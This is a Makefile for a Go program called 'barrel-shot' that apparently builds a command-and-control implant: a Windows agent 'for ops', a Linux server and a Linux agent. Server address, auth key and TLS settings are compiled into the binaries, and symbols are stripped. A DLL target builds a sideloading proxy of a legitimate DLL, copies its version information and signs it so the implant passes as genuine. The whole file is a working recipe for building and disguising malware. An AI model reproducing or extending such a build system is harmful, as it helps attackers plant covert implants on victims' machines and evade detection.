BINARY  = barrel-shot
MODULE  = barrel-shot/agent

LDFLAGS = -s -w

ifdef SERVER
  LDFLAGS += -X '$(MODULE).embeddedServer=$(SERVER)'
endif
ifdef AUTH
  LDFLAGS += -X '$(MODULE).embeddedAuth=$(AUTH)'
endif
ifdef FINGERPRINT
  LDFLAGS += -X '$(MODULE).embeddedFingerprint=$(FINGERPRINT)'
endif
ifdef REMOTES
  LDFLAGS += -X '$(MODULE).embeddedRemotes=$(REMOTES)'
endif
ifdef TLS_SKIP
  LDFLAGS += -X '$(MODULE).embeddedTLSSkip=1'
endif

FUNCTION ?= DllMain
ifneq ($(FUNCTION),DllMain)
  LDFLAGS += -X '$(MODULE).embeddedTrigger=$(FUNCTION)'
endif

EXTLDFLAGS = -Wl,--dynamicbase,--nxcompat,--high-entropy-va,--tsaware

.PHONY: agent server clean all agent-linux dll

# Windows agent (default target for ops)
agent:
	GOOS=windows GOARCH=amd64 go build -ldflags "$(LDFLAGS)" -o $(BINARY).exe .

# Linux server
server:
	GOOS=linux GOARCH=amd64 go build -ldflags "$(LDFLAGS)" -o $(BINARY) .

# Linux agent
agent-linux:
	GOOS=linux GOARCH=amd64 go build -ldflags "$(LDFLAGS)" -o $(BINARY)-agent .

# DLL sideload — PROXY is the DLL to proxy, FUNCTION is the trigger export (default: DllMain)
dll:
ifndef PROXY
	$(error PROXY required — path to DLL to proxy (e.g. PROXY=./version.dll))
endif
	go run ./cmd/proxygen $(PROXY) dll/ $(FUNCTION)
	@python3 versioninfo.py $(PROXY) dll/
	CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 \
		go build -buildmode=c-shared -tags dll \
		-ldflags "$(LDFLAGS) -extldflags '$(EXTLDFLAGS)'" \
		-o $(notdir $(PROXY)) ./dll/
	@rm -f $(basename $(notdir $(PROXY))).h dll/versioninfo.syso
	@bash sign.sh $(PROXY) $(notdir $(PROXY))

# Both server + agent
all: server agent

clean:
	rm -f $(BINARY) $(BINARY).exe $(BINARY)-agent
